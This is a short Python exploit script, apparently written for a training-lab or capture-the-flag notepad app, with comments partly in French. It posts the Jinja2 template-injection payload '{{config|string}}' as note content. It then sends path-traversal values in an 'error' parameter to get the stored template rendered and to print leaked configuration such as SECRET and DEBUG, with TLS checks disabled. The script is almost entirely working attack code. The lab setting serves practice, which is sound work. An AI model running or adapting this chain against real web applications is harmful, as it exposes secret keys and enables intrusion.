import sys, requests, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})

content = "{{config|string}}"
r = S.post(BASE + "/new", data={"content": content}, timeout=20, verify=False, allow_redirects=False)
loc = r.headers.get("Location", "")
m = re.search(r"/static/(.+)\.html$", loc)
name_enc = m.group(1)
print("nom encode:", name_enc)
for err in ("../../static/" + name_enc,
            "../static/" + name_enc,
            "..%2f..%2fstatic%2f" + name_enc):
    r2 = S.get(BASE + "/", params={"error": err}, timeout=20, verify=False)
    body = r2.text
    hit = "Config" in body or "SECRET" in body or "DEBUG" in body
    print(f"\nerror={err[:80]} -> {r2.status_code} len={len(body)} config_rendu={hit}")
    if hit:
        print(body[:1200])
        break
